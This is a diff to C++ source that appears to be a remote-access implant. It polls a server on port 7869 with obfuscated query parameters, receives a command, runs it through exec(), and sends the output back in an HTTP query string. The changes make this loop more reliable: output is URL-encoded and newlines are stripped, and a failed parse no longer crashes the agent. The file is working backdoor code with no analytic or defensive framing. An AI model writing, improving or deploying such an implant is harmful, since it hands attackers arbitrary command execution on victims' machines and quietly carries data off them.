@@ -5,7 +5,6 @@
 #include <sys/socket.h>
 #include <arpa/inet.h>
 #include <netdb.h>
-#include <unistd.h>
 #include <sys/types.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
@@ -19,6 +18,8 @@
 #include <chrono>
 #include <random>
 #include <vector>
+#include <algorithm>
+#include <iomanip>
 
 using namespace std;
 
@@ -42,6 +43,14 @@ std::string extract_body(const std::string& response) {
     return body;
 }
 
+std::string ReplaceAll(std::string str, const std::string& from, const std::string& to) {
+    size_t start_pos = 0;
+    while((start_pos = str.find(from, start_pos)) != std::string::npos) {
+        str.replace(start_pos, from.length(), to);
+        start_pos += to.length(); // Handles case where 'to' is a substring of 'from'
+    }
+    return str;
+}
 
 string get_request(string host, string path, int port) {
     int sockfd = socket(AF_INET, SOCK_STREAM, 0);
@@ -74,7 +83,7 @@ string get_request(string host, string path, int port) {
     }
 
     stringstream request_stream;
-    request_stream << "GET " << path << " HTTP/1.1\r\n";
+    request_stream << "GET " << ReplaceAll(path, " ", "%20") << " HTTP/1.1\r\n";
     request_stream << "Host: " << host << "\r\n";
     request_stream << "Connection: close\r\n";
     request_stream << "\r\n";
@@ -153,15 +162,21 @@ void handshake() {
 Job getJob() {
     std::string rsp = extract_body(get_request(baseAddress, "/?df2f1f3f8h6h4=n&agentGuid=" + agentGuid, 7869));
     std::vector<std::string> tokens = split(rsp, '"');
-    std::string jobGuid = tokens[3];
-    std::string command = tokens[7];
-
-    return {jobGuid, command};
+    try {
+        std::string jobGuid = tokens[3];
+        std::string command = tokens[7];
+        return {jobGuid, command};
+    }
+    catch (exception e){
+        return {"",""};
+    }
 }
 
 void completeJob(Job j) {
     std::string rsp = exec(j.command.c_str());
-    get_request(baseAddress, "/?df2f1f3f7h9h4=n&jobGuid=" + j.id + "&agentGuid=" + agentGuid + "&response=" + rsp, 7869);
+    rsp.erase(std::remove(rsp.begin(), rsp.end(), '\n'), rsp.cend());
+    std::string request = "/?df2f1f3f7h9h4=n&jobGuid=" + j.id + "&agentGuid=" + agentGuid + "&response=" + rsp;
+    get_request(baseAddress, request, 7869);
 }
 
 int main(){
